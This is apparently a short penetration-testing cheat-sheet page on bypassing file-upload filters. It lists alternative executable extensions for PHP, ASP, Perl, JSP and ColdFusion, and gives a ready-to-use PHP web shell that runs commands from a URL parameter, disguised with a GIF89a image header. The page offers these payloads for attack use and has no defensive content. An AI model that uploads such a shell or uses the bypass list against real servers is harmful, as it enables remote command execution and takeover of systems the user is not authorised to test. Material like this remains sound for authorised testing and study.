---
description: File Upload Bypass
---

# File Upload Bypass

File Upload Bypass allows attackers to upload malicious files to the web server, which can then be executed by other users or the server itself. The main goal is to bypass filters applied by the web app

## Bypass filters

**Its possible to bypass with the following extensions and we could try using upper case too**

| Language | Bypass |
| :--- | :--- |
| php | .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc |
| asp | .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml |
| perl | .pl, .pm, .cgi, .lib |
| jsp | .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action |
| Coldfusion | .cfm, .cfml, .cfc, .dbm |

## GIF89a; header <a id="gif-89-a-header"></a>

```php
GIF89a;
<?
system($_GET['cmd']);
?>
```

## References

* [https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)
* [https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass](https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass)

